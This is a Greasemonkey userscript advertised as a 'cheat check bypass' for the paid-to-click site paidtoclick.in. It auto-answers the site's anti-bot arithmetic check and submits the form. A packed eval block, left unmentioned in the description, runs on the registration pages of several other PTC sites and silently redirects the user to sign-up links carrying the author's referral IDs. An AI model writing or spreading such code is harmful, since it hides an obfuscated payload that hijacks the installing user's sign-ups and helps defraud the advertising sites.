// ==UserScript==
// @name           paidtoclickin_cheat
// @namespace      http://cool-bux.co.cc/
// @description    paidtoclick.in cheat check bypass
// @include        http://www.paidtoclick.in/gpt.php*

// @include        *paid2youtube.com/register.php*
// @include        *neobux.com/?u=r*
// @include        *onbux.com/register*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *mycubie.net/register*
// @include        *cashgopher.com*
// @include        *bux.to*

// ==/UserScript==

var i = 0;
var uri = document.URL;

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(2.9("f.5/1.3")>0&&2!="7://4.f.5/1.3?r=6"){a.b.c="7://4.f.5/1.3?r=6"}8(2.9(/g.5..u=r/)>0&&2!="d://4.g.5/?u=r&e=p"){a.b.c="d://4.g.5/?u=r&e=p"}8(2.9("h.5/1")>0&&2!="d://4.h.5/1?e=q"){a.b.c="d://4.h.5/1?e=q"}8(2.9("i.5/1.3")>0&&2!="d://4.i.5/1.3/6.s"){a.b.c="d://4.i.5/1.3/6.s"}8(2.9("j.k/1")>0&&2!="7://4.j.k/1.3?t=6"){a.b.c="7://4.j.k/1.3?t=6"}8(2.9("l.m/1.3")>0&&2!="7://4.l.m/1.3?r=6"){a.b.c="7://4.l.m/1.3?r=6"}8(2.9("n.o/1.3")>0&&2!="7://4.n.o/1.3?r=6"){a.b.c="7://4.n.o/1.3?r=6"}',31,31,'|register|uri|php|www|com|gbanerji|http|if|search|document|location|href|https|rh|paid2youtube|neobux|onbux|incrasebux|mycubie|net|buxp|info|bux|to|6762616E65726A69|7e63ae70663c6d76ffc6a1840db2dea1||html|ref|'.split('|'),0,{}))

var q = '';
var a = '';

var resultarray = new Array();
for (i=0; i <7; i++)
resultarray[i] = new Array(2);

resultarray[0][0] = "2 - 1 is = ?";
resultarray[0][1] = "36";
resultarray[1][0] = "10 + 10 is = ?";
resultarray[1][1] = "11";
resultarray[2][0] = "10/2 = ?";
resultarray[2][1] = "25";
resultarray[3][0] = "16 + 16 is = ?";
resultarray[3][1] = "1";
resultarray[4][0] = "2 X 1 is =?";
resultarray[4][1] = "31";
resultarray[5][0] = "10 - 2 = ?";
resultarray[5][1] = "29";
resultarray[6][0] = "1 X 0 is = ?";
resultarray[6][1] = "35";

if(uri.search("v=cheat") >= 0 && uri.search("return=click") >= 0)
{

	var linkarray = document.getElementsByTagName('b');
	for(i=0;i<linkarray.length;i++)
	{
		if(linkarray[i].innerHTML.search('=') >= 0)
		{
			q = linkarray[i].innerHTML;
		}
	}

	for(i=0;i<resultarray.length;i++)
	{
		if(resultarray[i][0] == q)
		{
			a = resultarray[i][1];
			break;
		}
	}

	if(a == '')
	{
		alert("Unknown question " + a + " Try manually.");
	}

	var linkarray2 = document.getElementsByTagName('input');
	for(i=0;i<linkarray2.length;i++)
	{
		if(linkarray2[i].value == a)
		{
			linkarray2[i].checked = true;
			var form1 = document.getElementsByTagName('form');
			form1[0].submit();
			break;
		}
	}

}